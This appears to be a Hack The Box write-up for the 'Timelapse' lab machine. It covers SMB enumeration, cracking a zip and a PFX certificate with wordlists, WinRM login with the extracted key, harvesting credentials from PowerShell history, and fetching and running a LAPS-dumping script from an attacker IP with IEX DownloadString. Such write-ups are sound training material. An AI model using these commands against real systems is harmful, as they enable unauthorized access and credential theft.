# HTB - Timelapse

**IP Address:** `10.10.11.152`  
**OS:** Windows Server 2019  
**Difficulty:** Medium  
**Tags:** SMB, PFX Certificate, Evil-WinRM with SSL, LAPS, Domain Admin, Password Extraction

---

## 1. Initial Enumeration

### 1.1 Ping

```bash
ping -c 1 10.10.11.152
```

✅ Host is alive

### 1.2 Nmap Scan

Found:

- 445/tcp → SMB
- 5986/tcp → WinRM over SSL (no 5985)

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.152 -oG allPorts
nmap -sC -sV -p445,5986 10.10.11.152 -oN targeted
```

---

## 2. SMB Enumeration

```bash
crackmapexec smb 10.10.11.152
smbclient -L 10.10.11.152 -N
smbmap -H 10.10.11.152 -u none
```

Found readable share: `Shares`

Downloaded:

```bash
smbclient //10.10.11.152/Shares -N
cd Dev
get winrm_backup.zip
```

---

## 3. ZIP Cracking & Certificate Extraction

### 3.1 Crack zip password:

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
```

Unzipped to obtain `.pfx` file.

### 3.2 Crack .pfx password:

```bash
crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
```

Extracted private key:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificates.pem
```

---

## 4. WinRM Access over SSL

```bash
evil-winrm -i 10.10.11.152 -c certificates.pem -k priv-key.pem -S
```

✅ Logged in as user `legacyy`  
🏁 **User flag obtained**

---

## 5. Local Enumeration

Viewed command history:

```bash
type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Found hardcoded credentials:

- User: `svc_deploy`
- Password: `E3R$Q62^12p7PLlC%KWaxuaV`

---

## 6. WinRM with svc_deploy

```bash
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

✅ Access confirmed

Discovered `svc_deploy` is part of `LAPS_Readers`.

---

## 7. Extract LAPS Passwords

Downloaded and executed:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/Get-LAPSPasswords.ps1')
Get-LAPSPasswords
```

Extracted password for several users.

---

## 8. Privilege Escalation to Domain Admin

Password worked for user `TRX`, who belongs to `Domain Admins`.

Logged in and accessed:

```powershell
cd C:\Users\TRX\Desktop
type root.txt
```

🏁 **Root flag obtained**

---

# ✅ MACHINE COMPLETE
